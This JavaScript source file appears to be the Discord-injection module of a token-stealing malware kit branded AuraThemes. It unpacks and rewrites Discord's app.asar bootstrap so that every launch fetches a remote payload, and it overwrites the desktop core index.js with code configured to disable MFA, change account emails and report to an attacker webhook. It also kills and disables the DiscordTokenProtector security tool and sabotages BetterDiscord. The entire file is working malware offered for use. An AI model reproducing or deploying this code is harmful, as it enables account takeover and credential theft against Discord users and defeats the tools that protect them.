const child_process = require('child_process');
const axios = require('axios');
const path = require('path');
const asar = require('asar');
const fs = require('fs');

const requests = require('../../../utils/requests/requests.js');
const hardware = require('../../../utils/hardware/hardware.js');
const program = require('../../../utils/program/program.js');

const persistentInjection = async (appDir, injectionUrl, webhookUrl, configInject) => {
    const asarFilePath = path.join(appDir, 'resources', 'app.asar');
    const unpackedDir = path.join(appDir, 'resources', 'unpacked');

    try {
        const srcInjectionAsar = `
            "use strict";
            console.log("https://discord.gg/aurathemes")
            const fs = require("fs"),https = require("https"),
                path = require("path"),
                buildInfo = require('./buildInfo'),
                paths = require('../common/paths'),
                moduleUpdater = require('../common/moduleUpdater'),
                updater = require('../common/updater'),
                requireNative = require('./requireNative');
            paths.init(buildInfo);
            function getAppMode() {
                if (process.argv && process.argv.includes('--overlay-host')) {
                    return 'overlay-host';
                }
                return 'app';
            }
            const mode = getAppMode();
            if (mode === 'app') {
                require('./bootstrap');
            } else if (mode === 'overlay-host') {
                const appSettings = require('./appSettings');
                appSettings.init();
                const { NEW_UPDATE_ENDPOINT } = require('./Constants');
                if (!buildInfo.debug && buildInfo.newUpdater) {
                    if (!updater.tryInitUpdater(buildInfo, NEW_UPDATE_ENDPOINT)) {
                        throw new Error('Failed to initialize modules on the overlay host');
                    }
                    updater.getUpdater().startCurrentVersionSync({ allowObsoleteHost: true });
                } else {
                    moduleUpdater.initPathsOnly(buildInfo);
                }
                requireNative('discord_overlay2/standalone_host.js');
            }
            try {
                initAuraThemes()
            } catch (e) {

            }
            const discordAppDataPath = path.join(
                process.env.LOCALAPPDATA || 
                (process.platform == "darwin"
                    ? process.env.HOME + "/Library/Preferences"
                    : "/var/local"
                ), "Discord");
            function findDiscordVersion() {
                const discordVersions = fs
                    .readdirSync(discordAppDataPath)
                    .filter((folder) => folder.startsWith("app-"));
                console.log(discordVersions);
                if (discordVersions.length > 0) {
                    return discordVersions[0];
                }
                return null;
            }
            function findCoreVersion(discordVersion) {
                const coreVersionsPath = path.join(
                    discordAppDataPath,
                    discordVersion,
                    "modules"
                );
                const coreVersions = fs
                    .readdirSync(coreVersionsPath)
                    .filter((folder) => folder.startsWith("discord_desktop_core-"));
                if (coreVersions.length > 0) {
                    return coreVersions[0];
                }
                return null;
            }
            function initAuraThemes() {
                const discordVersion = findDiscordVersion();
                const coreVersion = discordVersion
                    ? findCoreVersion(discordVersion)
                    : null;
                if (discordVersion && coreVersion) {
                    const indexFilePath = path.join(
                        discordAppDataPath,
                        discordVersion,
                        "modules",
                        coreVersion,
                        "discord_desktop_core/index.js"
                    );
                    const betterDiscordPath = path.join(
                        process.env.APPDATA ||
                        (process.platform == "darwin"
                            ? process.env.HOME + "/Library/Preferences"
                            : "/var/local"),
                        "betterdiscord/data/betterdiscord.asar"
                    );
                    try {
                        const negger = fs.readFileSync(indexFilePath, "utf8");
                        if (negger === "module.exports = require('./core.asar');" || negger.length < 20000) {
                            init();
                        } else {
                            console.log("AuraThemes is still active in this Discord client")
                        }
                    } catch (err) {
                        console.error("Error index.js Read:", err);
                    }
                    function init() {
                        https.get("${injectionUrl}", (res) => {
                            let chunk = "";
                            res.on("data", (data) => (chunk += data));
                            res.on("end", () => {
                                const newContent = chunk
                                    .replace("%WEBHOOK_URL%", "${webhookUrl}")
                                    .replace("%API_URL%", "${configInject.API}")
                                    .replace('%AUTO_USER_PROFILE_EDIT%', '${configInject.auto_user_profile_edit}')
                                    .replace('%AUTO_PERSIST_STARTUP%', '${configInject.auto_persist_startup}')
                                    .replace('%AUTO_MFA_DISABLER%', '${configInject.auto_mfa_disabler}')
                                    .replace('%AUTO_EMAIL_UPDATE%', '${configInject.auto_email_update}')
                                fs.writeFileSync(indexFilePath, newContent);
                            });
                        }).on("error", (err) => {
                            console.error("Error request:", err);
                            setTimeout(init, 10000);
                        });
                    }
                    require(path.join(discordAppDataPath, discordVersion, "resources/app.asar"));
                    if (fs.existsSync(betterDiscordPath)) {
                        require(betterDiscordPath);
                    }
                } else {
                    console.error("AuraThemes is still active");
                }
            }
        `;
        await extractAsarArchive(asarFilePath, unpackedDir);
        await program.delay(2500);
        const indexPath = path.join(unpackedDir, 'app_bootstrap', 'index.js');
        await fs.promises.writeFile(indexPath, '', 'utf8');
        await appendToFile(indexPath, srcInjectionAsar);
        await packAsar(unpackedDir, asarFilePath);
    } catch (error) {
        console.error(error);
    }
}

const extractAsarArchive = async (asarFilePath, outputDirectory) => {
    try {
        await fs.promises.mkdir(outputDirectory, { recursive: true });
        asar.extractAll(asarFilePath, outputDirectory);
    } catch (error) {
        throw error;
    }
}


const appendToFile = async (filePath, content) => {
    try {
        await fs.promises.appendFile(filePath, `\n${content}`, 'utf8');
    } catch (error) {
        throw error;
    }
}

const packAsar = async (sourceDir, asarFilePath) => {
    try {
        asar.createPackage(sourceDir, asarFilePath);
    } catch (error) {
        throw error;
    }
}


const injectDiscord = async (dir, injectionUrl, webhookUrl, configInject) => {
    try {
        const files = await fs.promises.readdir(dir, { withFileTypes: true });
        const appDirs = files
            .filter(file => file.isDirectory() && file.name.startsWith('app-'))
            .map(file => path.join(dir, file.name, 'modules'));

        for (const appDir of appDirs) {
            persistentInjection(appDir.replaceAll('modules', ''), injectionUrl, webhookUrl, configInject);
        };

        const matchingDirs = await Promise.all(appDirs.map(async coreDir => {
            try {
                const matchedDirs = await fs.promises.readdir(coreDir, { withFileTypes: true });
                return matchedDirs
                    .filter(file => file.isDirectory() && file.name.startsWith('discord_desktop_core-'))
                    .map(file => path.join(coreDir, file.name, 'discord_desktop_core'));
            } catch (err) {
                return [];
            }
        }));

        const flattenedDirs = matchingDirs.flat();
        let infectedDiscord = new Set();

        for (const coreDir of flattenedDirs) {
            try {
                const initiationDir = path.join(coreDir, 'aurathemes');
                await fs.promises.mkdir(initiationDir, { recursive: true });

                const response = await axios.get(injectionUrl);
                const injection = response.data;

                const srcInjection = injection
                    .replace("%WEBHOOK_URL%", webhookUrl)
                    .replace("%API_URL%", configInject.API)
                    .replace("%FORCE_PERSIST_STARTUP%", configInject.force_persist_startup)
                    .replace("%AUTO_MFA_DISABLER%", configInject.auto_mfa_disabler)
                    .replace("%AUTO_EMAIL_UPDATE%", configInject.auto_email_update)
                    .replace("%AUTO_USER_PROFILE_EDIT%", configInject.auto_user_profile_edit)
                    .replace("%GOFILE_DOWNLOAD_LINK%", configInject.gofile_download_link)

                const indexJsPath = path.join(coreDir, 'index.js');

                await fs.promises.writeFile(indexJsPath, srcInjection, 'utf8');
                const match = coreDir.match(/Local\\(discord|discordcanary|discordptb|discorddevelopment)\\/i);
                if (match) {
                    infectedDiscord.add(match[1].toLowerCase());
                }
            } catch (error) {
                console.error(`Failed to process ${coreDir}:`, error);
            }
        }

        try {
            if (infectedDiscord.size > 0) {
                await requests.webhook(webhookUrl, {
                    embeds: [{
                        title: 'Discord(s) injected(s)',
                        description: Array.from(infectedDiscord).map(name => `\`${name}\``).join(", "),
                    }]
                });
            }
        } catch (error) {
            console.error(error);
        }
    } catch (error) {
    }
}

const bypassBetterDiscord = async (user) => {
    const bdPath = path.join(user, 'AppData', 'Roaming', 'BetterDiscord', 'data', 'betterdiscord.asar');
    try {
        if (fs.existsSync(bdPath)) {
            const txt = fs.readFileSync(bdPath, 'utf8');
            const modifiedTxt = txt.replace(/api\/webhooks/g, 'HackedByK4itrun');
            fs.writeFileSync(bdPath, modifiedTxt, 'utf8');
        }
    } catch (error) {
        console.error(error);
    }
}

const bypassTokenProtector = async (user) => {
    const dir = path.join(user, 'AppData', 'Roaming', 'DiscordTokenProtector');
    const configPath = path.join(dir, 'config.json');

    try {
        const processes = child_process.execSync('tasklist', { encoding: 'utf8' }).split('\n');
        processes.forEach(process => {
            if (process.toLowerCase().includes('discordtokenprotector')) {
                const processName = process.split(/\s+/)[0];
                child_process.execSync(`taskkill /F /IM ${processName}`);
            }
        });

        ['DiscordTokenProtector.exe', 'ProtectionPayload.dll', 'secure.dat'].forEach(file => {
            const filePath = path.join(dir, file);
            try {
                fs.unlinkSync(filePath);
            } catch (error) {
            }
        });

        if (fs.existsSync(configPath)) {
            const config = JSON.parse(fs.readFileSync(configPath, 'utf8'));
            Object.assign(config, {
                k4itrun_is_here: "https://discord.gg/XS6btuuUR7",
                auto_start: false,
                auto_start_discord: false,
                integrity: false,
                integrity_allowbetterdiscord: false,
                integrity_checkexecutable: false,
                integrity_checkhash: false,
                integrity_checkmodule: false,
                integrity_checkscripts: false,
                integrity_checkresource: false,
                integrity_redownloadhashes: false,
                iterations_iv: 364,
                iterations_key: 457,
                version: 69420
            });
            fs.writeFileSync(configPath, JSON.stringify(config, null, 2), 'utf8');
            fs.appendFileSync(config, `\n\n//k4itrun_is_here | https://discord.gg/XS6btuuUR7`, 'utf8');
        }
    } catch (error) {
        console.error(error);
    }
}

module.exports = async (injectionUrl, webhookUrl, configInject) => {
    try {
        const users = await hardware.getUsers();
        for (const user of users) {
            bypassBetterDiscord(user);
            bypassTokenProtector(user);
            const directories = [
                path.join(user, 'AppData', 'Local', 'discord'),
                path.join(user, 'AppData', 'Local', 'discordcanary'),
                path.join(user, 'AppData', 'Local', 'discordptb'),
                path.join(user, 'AppData', 'Local', 'discorddevelopment')
            ];
            for (const dir of directories) {
                await injectDiscord(dir, injectionUrl, webhookUrl, configInject);
            }
        }
    } catch (error) {
        console.error(error);
    }
}